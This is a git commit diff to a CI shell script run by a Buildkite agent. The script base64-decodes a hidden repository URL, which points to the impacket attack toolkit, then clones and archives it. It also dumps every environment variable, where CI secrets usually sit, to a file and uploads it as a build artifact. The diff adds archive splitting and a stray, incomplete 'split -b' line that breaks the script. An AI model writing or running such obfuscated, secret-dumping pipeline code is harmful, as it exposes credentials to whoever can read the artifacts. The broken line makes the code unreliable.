346234dbc1f91a39193d15054f15c474b086604e
Josh Fetzer <jlfetzer@protonmail.com>
2023-04-12 10:33:05 +1000

    testing archive split

--- script.sh
+++ script.sh
@@ -1,17 +1,19 @@
 set -eo pipefail
 
 RES=`mktemp`
-ARCHIVE=`mktemp`
+ARCHIVE=`mktemp XXXXXXXXXX.tar.gz`
 
 REPO=`echo -n "aHR0cHM6Ly9naXRodWIuY29tL2ZvcnRyYS9pbXBhY2tldA==" | base64 -d`
 REPO_PATH=`echo $REPO | awk -F '/' '{print $NF}'`
 
 git clone $REPO --single-branch
-tar czf $ARCHIVE $REPO_PATH
+tar czf - $REPO_PATH | split -b 10m - "$ARCHIVE."
+
+split -b
 
 env > $RES
 
 buildkite-agent artifact upload $RES
-buildkite-agent artifact upload $ARCHIVE
+buildkite-agent artifact upload "$ARCHIVE.*"
 
 rm -rf $RES $ARCHIVE $REPO_PATH
